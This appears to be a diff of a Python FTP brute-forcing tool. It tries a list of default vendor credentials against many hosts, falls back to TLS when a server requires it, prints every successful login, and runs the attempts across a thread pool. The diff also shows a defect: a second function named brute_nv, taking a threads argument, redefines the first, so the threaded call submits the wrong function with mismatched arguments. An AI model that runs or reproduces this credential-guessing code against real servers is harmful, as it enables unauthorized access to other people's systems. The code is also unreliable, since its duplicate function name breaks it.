@@ -74,36 +74,35 @@ creds = [
 "PlcmSpIp:PlcmSpIp",
 ]
 
-def brute_nv(hosts: list[str], creds: list[str], errors, verbose):
-    for host in hosts:
-        try:
-            ip = host.split(":")[0]
-            port  = int(host.split(":")[1])
-            
-            for cred in creds:
-                username, password = cred.split(":")
-                try:
-                    ftp = FTP()
+def brute_nv(host, creds: list[str], errors, verbose):
+    try:
+        ip = host.split(":")[0]
+        port  = int(host.split(":")[1])
+        
+        for cred in creds:
+            username, password = cred.split(":")
+            try:
+                ftp = FTP()
+                ftp.connect(ip, port, timeout=10)
+                l = ftp.login(username, password)
+                if "230" in l:
+                    print(f"[+] {host} => {username}:{password}")
+            except Error as e:
+                if "must use encryption" in str(e):
+                    ftp = FTP_TLS()
                     ftp.connect(ip, port, timeout=10)
-                    l = ftp.login(username, password)
-                    if "230" in l:
-                        print(f"[+] {host} => {username}:{password}")
-                except Error as e:
-                    if "must use encryption" in str(e):
-                        ftp = FTP_TLS()
-                        ftp.connect(ip, port, timeout=10)
-                        try:
-                            l = ftp.login(username, password)
-                            if "230" in l:
-                                print(f"[+] {host} => {username}:{password}")
-                        except error_perm as ee:
-                            if errors: print("Error:", ee)
-                            continue
-                        except Error as eee:
-                            if errors: print("Error:", eee)
-                            continue
-        except Exception as e: 
-            if errors: print("Error:", e)
+                    try:
+                        l = ftp.login(username, password)
+                        if "230" in l:
+                            print(f"[+] {host} => {username}:{password}")
+                    except error_perm as ee:
+                        if errors: print("Error:", ee)
+                        continue
+                    except Error as eee:
+                        if errors: print("Error:", eee)
+                        continue
+    except Exception as e: 
+        if errors: print("Error:", e)
         
 def anon_nv(hosts, errors = False, verbose = False):
     anon = []
@@ -148,7 +147,8 @@ def tls(hosts):
 
 def brute_nv(hosts: list[str], creds: list[str], threads, errors, verbose):
     with ThreadPoolExecutor(threads) as executor:
-        executor.map(lambda host: brute_nv(host, creds, errors, verbose), hosts)
+        for host in hosts:
+            executor.submit(brute_nv, host, creds, errors, verbose)
         
 def ssl(hosts):
     dict = {}
